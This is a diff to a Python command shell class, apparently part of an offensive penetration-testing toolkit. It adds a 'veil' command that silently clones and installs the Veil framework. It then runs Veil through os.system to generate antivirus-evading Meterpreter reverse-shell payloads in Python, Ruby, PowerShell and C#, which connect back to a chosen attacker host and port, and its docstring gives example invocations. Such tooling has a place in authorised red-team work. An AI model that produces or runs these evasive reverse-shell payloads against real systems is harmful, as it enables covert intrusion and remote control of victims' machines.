@@ -10532,6 +10532,80 @@ class LazyOwnShell(Cmd):
         os.system(command)
         return
 
+    def do_veil(self, line):
+        """
+        Generates payloads using Veil-Evasion with various options. Veil-Evasion is a payload creation framework
+        for generating payloads that evade antivirus detection. This function checks if `Veil-Evasion` is installed
+        and installs it if necessary. It then runs `Veil-Evasion` with the specified parameters to create various payloads.
+
+        :param line: Not used in this implementation but reserved for future use.
+
+        :returns: None
+
+        Manual execution:
+        To manually generate a payload using Veil-Evasion, use the following command:
+            ./Veil-Evasion.py -p <PAYLOAD> --<OPTION> <VALUE>
+
+        Replace the placeholders with the desired values. For example:
+            ./Veil-Evasion.py -p python/meterpreter/rev_https LHOST=192.168.1.100 LPORT=443
+
+        Example usage:
+            veil python_meterpreter_rev_https LHOST=192.168.1.100 LPORT=443
+            veil ruby_meterpreter_rev_tcp LHOST=192.168.1.100 LPORT=4444
+        """
+        lport = self.params["lport"]
+        lhost = self.params["lhost"]
+        if not check_lhost(lhost):
+            return
+        if not check_lport(lport):
+            return    
+
+        if not is_binary_present("Veil-Evasion.py"):
+            print_warn("Veil-Evasion is not installed. Installing Veil-Evasion...")
+            os.system("git clone https://github.com/Veil-Framework/Veil.git external/.exploit/Veil")
+            os.system("cd external/.exploit/Veil && ./config/setup.sh --force --silent")
+        
+        
+        options = {
+            "python_meterpreter_rev_https": {
+                "cmd": "Veil-Evasion.py -p python/meterpreter/rev_https LHOST={lhost} LPORT={lport} -o {output_file}"
+            },
+            "ruby_meterpreter_rev_tcp": {
+                "cmd": "Veil-Evasion.py -p ruby/meterpreter/rev_tcp LHOST={lhost} LPORT={lport} -o {output_file}"
+            },
+            "powershell_meterpreter_https": {
+                "cmd": "Veil-Evasion.py -p powershell/meterpreter/rev_https LHOST={lhost} LPORT={lport} -o {output_file}"
+            },
+            "c_sharp_meterpreter_https": {
+                "cmd": "Veil-Evasion.py -p csharp/meterpreter/rev_https LHOST={lhost} LPORT={lport} -o {output_file}"
+            }
+        }
+        
+        # User input for selecting payload type and parameters
+        print_warn("Select the payload type:")
+        for i, option in enumerate(options.keys(), start=1):
+            print_msg(f"{i}. {option.replace('_', ' ').title()}")
+
+        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
+        if type_choice < 0 or type_choice >= len(options):
+            print_error("Invalid choice. Please select a valid number.")
+            return
+
+        selected_type = list(options.keys())[type_choice]
+
+        params = {
+            "lhost": lhost,
+            "lport": lport,
+            "output_file": "sessions/payload.txt"
+        }
+
+        veil_command = options[selected_type]["cmd"].format(**params)
+
+        print_msg(f"Generating payload with Veil-Evasion: {veil_command}")
+        os.system(veil_command)
+        
+        return
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
